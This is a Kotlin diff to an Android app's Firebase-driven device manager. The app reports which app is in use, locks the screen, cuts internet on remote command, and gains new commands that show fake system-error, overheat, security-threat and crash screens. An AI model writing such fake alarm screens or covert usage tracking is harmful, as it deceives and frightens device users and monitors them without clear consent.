@@ -25,13 +25,17 @@ object FirebaseDeviceManager {
     private var lastSyncedApp = ""
 
     private fun resolveDeviceId(): String {
-        val model = Build.MODEL ?: "unknown"
+        val model = Build.MODEL ?: ""
+        val device = Build.DEVICE ?: ""
+        val product = Build.PRODUCT ?: ""
+        val combined = "$model $device $product".lowercase()
+
         return when {
-            model.contains("Note 9 Pro", ignoreCase = true) || model.contains("M2007J20", ignoreCase = true) -> "device_note9pro"
-            model.contains("9T", ignoreCase = true) || model.contains("M2010J19", ignoreCase = true) -> "device_redmi9t"
-            model.contains("Pad", ignoreCase = true) || model.contains("23073", ignoreCase = true) || model.contains("24075", ignoreCase = true) -> "device_padse"
-            model.contains("iQOO", ignoreCase = true) || model.contains("I2401", ignoreCase = true) -> "device_iqooz10"
-            else -> "device_" + model.replace("[^a-zA-Z0-9]".toRegex(), "_").lowercase()
+            combined.contains("note 9 pro") || combined.contains("m2007j20") || combined.contains("joyeuse") || combined.contains("curtana") -> "device_note9pro"
+            combined.contains("9t") || combined.contains("m2010j19") || combined.contains("lime") -> "device_redmi9t"
+            combined.contains("pad") || combined.contains("23073") || combined.contains("24075") || combined.contains("xun") || combined.contains("flame") -> "device_padse"
+            combined.contains("iqoo") || combined.contains("i2401") -> "device_iqooz10"
+            else -> "device_" + model.replace("[^a-zA-Z0-9]".toRegex(), "_").lowercase().ifEmpty { "unknown" }
         }
     }
 
@@ -51,6 +55,7 @@ object FirebaseDeviceManager {
 
         try {
             val db = FirebaseDatabase.getInstance(FIREBASE_URL)
+            db.goOnline()
             val deviceRef = db.getReference("devices").child(deviceId)
 
             // 1. Initial Status Sync
@@ -58,18 +63,19 @@ object FirebaseDeviceManager {
 
             // 2. Command Listener (Zero Polling - Push-Triggered via SSE)
             val cmdRef = deviceRef.child("command")
+            cmdRef.keepSynced(true)
             cmdRef.addValueEventListener(object : ValueEventListener {
                 private var initialLoad = true
 
                 override fun onDataChange(snapshot: DataSnapshot) {
-                    val action = snapshot.child("action").getValue(String::class.java) ?: return
-                    val timestamp = snapshot.child("timestamp").getValue(Long::class.java) ?: 0L
+                    val action = snapshot.child("action").value?.toString() ?: return
+                    val timestamp = (snapshot.child("timestamp").value as? Number)?.toLong() ?: 0L
 
                     // Handle initial load / boot commands without discarding critical state changes
                     if (initialLoad) {
                         initialLoad = false
-                        val ageMs = System.currentTimeMillis() - timestamp
-                        val isStale = ageMs > 10 * 60 * 1000L // 10 minutes tolerance
+                        val ageMs = Math.abs(System.currentTimeMillis() - timestamp)
+                        val isStale = ageMs > 15 * 60 * 1000L // 15 minutes tolerance
 
                         // Never skip if the device's actual current state doesn't match the command
                         val shouldSkip = when (action.uppercase()) {
@@ -114,7 +120,7 @@ object FirebaseDeviceManager {
                 "isInternetBlocked" to (AppState.isInternetBlocked || DwisnuLabsKillSwitchService.isRunning),
                 "currentApp" to AppState.currentForegroundAppName,
                 "currentPackage" to AppState.currentForegroundPackage,
-                "lastSeen" to System.currentTimeMillis()
+                "lastSeen" to com.google.firebase.database.ServerValue.TIMESTAMP
             )
 
             deviceRef.updateChildren(statusMap)
@@ -133,7 +139,8 @@ object FirebaseDeviceManager {
 
     private fun executeCommand(context: Context, action: String) {
         mainHandler.post {
-            when (action.uppercase()) {
+            val normalized = action.uppercase().replace("-", "_")
+            when (normalized) {
                 "LOCK" -> {
                     LockOverlayManager.show(context)
                     syncStatus(context)
@@ -143,15 +150,15 @@ object FirebaseDeviceManager {
                     AppState.unlockUntilEpochMs = 0L
                     syncStatus(context)
                 }
-                "UNLOCK15" -> {
+                "UNLOCK15", "CMD_UNLOCK_15M" -> {
                     LockOverlayManager.hide()
-                    AppState.unlockUntilEpochMs = System.currentTimeMillis() + 15 * 60 * 1000
+                    AppState.unlockUntilEpochMs = System.currentTimeMillis() + 15 * 60 * 1000L
                     scheduleAutoRelock(context, 15 * 60 * 1000L)
                     syncStatus(context)
                 }
-                "UNLOCK30" -> {
+                "UNLOCK30", "CMD_UNLOCK_30M" -> {
                     LockOverlayManager.hide()
-                    AppState.unlockUntilEpochMs = System.currentTimeMillis() + 30 * 60 * 1000
+                    AppState.unlockUntilEpochMs = System.currentTimeMillis() + 30 * 60 * 1000L
                     scheduleAutoRelock(context, 30 * 60 * 1000L)
                     syncStatus(context)
                 }
@@ -169,6 +176,26 @@ object FirebaseDeviceManager {
                     AppState.isInternetBlocked = true
                     DwisnuLabsKillSwitchService.start(context)
                     scheduleAutoRestoreInternet(context, 30 * 60 * 1000L)
+                    syncStatus(context)
+                }
+                "THEME_SYSTEM_ERROR", "SET_THEME_ERROR" -> {
+                    AppState.scareTheme = ScareTheme.SYSTEM_ERROR
+                    if (AppState.isLocked) LockOverlayManager.show(context)
+                    syncStatus(context)
+                }
+                "THEME_OVERHEAT", "SET_THEME_OVERHEAT" -> {
+                    AppState.scareTheme = ScareTheme.OVERHEAT
+                    if (AppState.isLocked) LockOverlayManager.show(context)
+                    syncStatus(context)
+                }
+                "THEME_SECURITY_THREAT", "SET_THEME_THREAT" -> {
+                    AppState.scareTheme = ScareTheme.SECURITY_THREAT
+                    if (AppState.isLocked) LockOverlayManager.show(context)
+                    syncStatus(context)
+                }
+                "THEME_FAKE_CRASH", "SET_THEME_CRASH" -> {
+                    AppState.scareTheme = ScareTheme.FAKE_CRASH
+                    if (AppState.isLocked) LockOverlayManager.show(context)
                     syncStatus(context)
                 }
                 else -> {
